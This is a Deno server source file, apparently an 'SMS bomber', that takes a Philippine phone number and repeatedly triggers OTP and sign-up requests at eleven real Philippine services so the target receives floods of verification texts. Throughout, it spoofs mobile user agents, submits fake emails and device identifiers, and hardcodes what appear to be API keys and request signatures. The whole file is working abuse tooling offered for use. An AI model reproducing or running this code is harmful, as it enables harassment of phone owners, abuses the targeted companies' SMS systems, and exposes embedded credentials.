import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

function randomString(length: number): string {
  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function formatPhoneNumber(phone: string): string {
  const cleaned = phone.replace(/[\s-]/g, '');
  if (cleaned.startsWith('0')) {
    return '+63' + cleaned.substring(1);
  } else if (cleaned.startsWith('63') && !cleaned.startsWith('+63')) {
    return '+' + cleaned;
  } else if (!cleaned.startsWith('+63') && cleaned.length === 10) {
    return '+63' + cleaned;
  } else if (!cleaned.startsWith('+')) {
    return '+63' + cleaned;
  }
  return cleaned;
}

function formatLocalNumber(phone: string): string {
  const formatted = formatPhoneNumber(phone);
  return formatted.replace('+63', '').replace(/^0/, '');
}

interface ServiceResult {
  name: string;
  success: boolean;
}

async function sendEzloan(phone: string): Promise<ServiceResult> {
  const name = 'EZLOAN';
  try {
    const response = await fetch('https://gateway.ezloancash.ph/security/auth/otp/request', {
      method: 'POST',
      headers: {
        'User-Agent': 'okhttp/4.9.2',
        'Accept': 'application/json',
        'Content-Type': 'application/json',
        'accept-language': 'en',
        'device': 'android',
        'appversion': '2.0.4',
      },
      body: JSON.stringify({
        businessId: 'EZLOAN',
        contactNumber: phone,
        appsflyerIdentifier: '1760444943092-3966994042140191452'
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendXpress(phone: string, i: number): Promise<ServiceResult> {
  const name = 'XPRESS PH';
  try {
    const formatted = formatPhoneNumber(phone);
    const response = await fetch('https://api.xpress.ph/v1/api/XpressUser/CreateUser/SendOtp', {
      method: 'POST',
      headers: {
        'User-Agent': 'Dalvik/2.1.0',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        FirstName: 'user',
        LastName: 'test',
        Email: `user${Date.now()}_${i}@gmail.com`,
        Phone: formatted,
        Password: 'Pass1234',
        ConfirmPassword: 'Pass1234',
        FingerprintVisitorId: 'TPt0yCuOFim3N3rzvrL1',
        FingerprintRequestId: '1757149666261.Rr1VvG',
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendAbenson(phone: string): Promise<ServiceResult> {
  const name = 'ABENSON';
  try {
    const response = await fetch('https://api.mobile.abenson.com/api/public/membership/activate_otp', {
      method: 'POST',
      headers: {
        'User-Agent': 'okhttp/4.9.0',
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `contact_no=${phone}&login_token=undefined`
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendExcellentLending(phone: string): Promise<ServiceResult> {
  const name = 'EXCELLENT LENDING';
  try {
    const coords = [
      { lat: '14.5995', long: '120.9842' },
      { lat: '14.6760', long: '121.0437' },
      { lat: '14.8648', long: '121.0418' }
    ];
    const coord = coords[Math.floor(Math.random() * coords.length)];
    
    const response = await fetch('https://api.excellenteralending.com/dllin/union/rehabilitation/dock', {
      method: 'POST',
      headers: {
        'User-Agent': 'okhttp/4.12.0',
        'Content-Type': 'application/json; charset=utf-8',
        'x-latitude': coord.lat,
        'x-longitude': coord.long
      },
      body: JSON.stringify({
        domain: phone,
        cat: 'login',
        previous: false,
        financial: 'efe35521e51f924efcad5d61d61072a9'
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendFortunePay(phone: string): Promise<ServiceResult> {
  const name = 'FORTUNE PAY';
  try {
    const localNum = formatLocalNumber(phone);
    const response = await fetch('https://api.fortunepay.com.ph/customer/v2/api/public/service/customer/register', {
      method: 'POST',
      headers: {
        'User-Agent': 'Dart/3.6 (dart:io)',
        'Content-Type': 'application/json',
        'app-type': 'GOOGLE_PLAY',
        'authorization': 'Bearer',
        'app-version': '4.3.5',
        'signature': 'edwYEFomiu5NWxkILnWePMektwl9umtzC+HIcE1S0oY=',
        'timestamp': String(Date.now()),
        'nonce': `${randomString(10)}-${Date.now()}`
      },
      body: JSON.stringify({
        deviceId: 'c31a9bc0-652d-11f0-88cf-9d4076456969',
        deviceType: 'GOOGLE_PLAY',
        companyId: '4bf735e97269421a80b82359e7dc2288',
        dialCode: '+63',
        phoneNumber: localNum
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendWemove(phone: string): Promise<ServiceResult> {
  const name = 'WEMOVE';
  try {
    const localNum = formatLocalNumber(phone);
    const response = await fetch('https://api.wemove.com.ph/auth/users', {
      method: 'POST',
      headers: {
        'User-Agent': 'okhttp/4.9.3',
        'Content-Type': 'application/json',
        'xuid_type': 'user',
        'source': 'customer',
        'authorization': 'Bearer'
      },
      body: JSON.stringify({
        phone_country: '+63',
        phone_no: localNum
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendLbc(phone: string): Promise<ServiceResult> {
  const name = 'LBC CONNECT';
  try {
    const localNum = formatLocalNumber(phone);
    const data = new URLSearchParams({
      verification_type: 'mobile',
      client_email: `${randomString(8)}@gmail.com`,
      client_contact_code: '+63',
      client_contact_no: localNum,
      app_log_uid: randomString(16),
    });
    
    const response = await fetch('https://lbcconnect.lbcapps.com/lbcconnectAPISprint2BPSGC/AClientThree/processInitRegistrationVerification', {
      method: 'POST',
      headers: {
        'User-Agent': 'Dart/2.19 (dart:io)',
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: data.toString()
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendPickupCoffee(phone: string): Promise<ServiceResult> {
  const name = 'PICKUP COFFEE';
  try {
    const formatted = formatPhoneNumber(phone);
    const response = await fetch('https://production.api.pickup-coffee.net/v2/customers/login', {
      method: 'POST',
      headers: {
        'User-Agent': 'okhttp/4.12.0',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        mobile_number: formatted,
        login_method: 'mobile_number'
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendHoneyLoan(phone: string): Promise<ServiceResult> {
  const name = 'HONEY LOAN';
  try {
    const response = await fetch('https://api.honeyloan.ph/api/client/registration/step-one', {
      method: 'POST',
      headers: {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 15)',
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        phone: phone,
        is_rights_block_accepted: 1
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendKomoPh(phone: string): Promise<ServiceResult> {
  const name = 'KOMO PH';
  try {
    const response = await fetch('https://api.komo.ph/api/otp/v5/generate', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Signature': 'ET/C2QyGZtmcDK60Jcavw2U+rhHtiO/HpUTT4clTiISFTIshiM58ODeZwiLWqUFo51Nr5rVQjNl6Vstr82a8PA==',
        'Ocp-Apim-Subscription-Key': 'cfde6d29634f44d3b81053ffc6298cba'
      },
      body: JSON.stringify({
        mobile: phone,
        transactionType: 6
      })
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function sendS5Otp(phone: string): Promise<ServiceResult> {
  const name = 'S5.COM';
  try {
    const normalized = formatPhoneNumber(phone);
    const boundary = '----WebKitFormBoundary4wi4VH3ZsWtBXCct';
    const body = `------${boundary}\r\nContent-Disposition: form-data; name="phone_number"\r\n\r\n${normalized}\r\n------${boundary}--\r\n`;
    
    const response = await fetch('https://api.s5.com/player/api/v1/otp/request', {
      method: 'POST',
      headers: {
        'accept': 'application/json, text/plain, */*',
        'content-type': `multipart/form-data; boundary=----${boundary}`,
        'origin': 'https://www.s5.com',
        'referer': 'https://www.s5.com/',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
        'x-public-api-key': 'd6a6d988-e73e-4402-8e52-6df554cbfb35',
        'x-locale': 'en',
        'x-timezone-offset': '480'
      },
      body: body
    });
    return { name, success: response.status >= 200 && response.status < 300 };
  } catch {
    return { name, success: false };
  }
}

async function executeAttack(phone: string, iteration: number): Promise<{ results: ServiceResult[]; successCount: number; failCount: number }> {
  const results: ServiceResult[] = [];
  
  // Execute all services in parallel
  const promises = [
    sendEzloan(phone),
    sendXpress(phone, iteration),
    sendAbenson(phone),
    sendExcellentLending(phone),
    sendFortunePay(phone),
    sendWemove(phone),
    sendLbc(phone),
    sendPickupCoffee(phone),
    sendHoneyLoan(phone),
    sendKomoPh(phone),
    sendS5Otp(phone),
  ];

  const settled = await Promise.allSettled(promises);
  
  for (const result of settled) {
    if (result.status === 'fulfilled') {
      results.push(result.value);
    } else {
      results.push({ name: 'Unknown', success: false });
    }
  }

  const successCount = results.filter(r => r.success).length;
  const failCount = results.filter(r => !r.success).length;

  return { results, successCount, failCount };
}

serve(async (req) => {
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { phone, iterations = 1 } = await req.json();
    
    if (!phone) {
      return new Response(
        JSON.stringify({ error: 'Phone number is required' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    // Validate phone format
    const cleaned = phone.replace(/[\s-]/g, '');
    const validPatterns = [
      /^09\d{9}$/,
      /^9\d{9}$/,
      /^\+639\d{9}$/,
      /^639\d{9}$/
    ];
    
    const isValid = validPatterns.some(p => p.test(cleaned));
    if (!isValid) {
      return new Response(
        JSON.stringify({ error: 'Invalid phone number format. Use PH format (09XXXXXXXXX or +639XXXXXXXXX)' }),
        { status: 400, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
      );
    }

    const formattedPhone = formatPhoneNumber(phone);
    console.log(`[SMS_BOMBER] Starting attack on ${formattedPhone} with ${iterations} iterations`);

    let totalSuccess = 0;
    let totalFail = 0;
    const allResults: { iteration: number; results: ServiceResult[] }[] = [];

    // Limit iterations to prevent abuse
    const maxIterations = Math.min(iterations, 10);

    for (let i = 0; i < maxIterations; i++) {
      console.log(`[SMS_BOMBER] Iteration ${i + 1}/${maxIterations}`);
      const { results, successCount, failCount } = await executeAttack(formattedPhone, i);
      
      allResults.push({ iteration: i + 1, results });
      totalSuccess += successCount;
      totalFail += failCount;

      // Small delay between iterations
      if (i < maxIterations - 1) {
        await new Promise(resolve => setTimeout(resolve, 500));
      }
    }

    console.log(`[SMS_BOMBER] Complete. Success: ${totalSuccess}, Fail: ${totalFail}`);

    return new Response(
      JSON.stringify({
        success: true,
        phone: formattedPhone,
        iterations: maxIterations,
        totalSuccess,
        totalFail,
        results: allResults
      }),
      { headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );

  } catch (error: unknown) {
    console.error('[SMS_BOMBER] Error:', error);
    const message = error instanceof Error ? error.message : 'Internal server error';
    return new Response(
      JSON.stringify({ error: message }),
      { status: 500, headers: { ...corsHeaders, 'Content-Type': 'application/json' } }
    );
  }
});
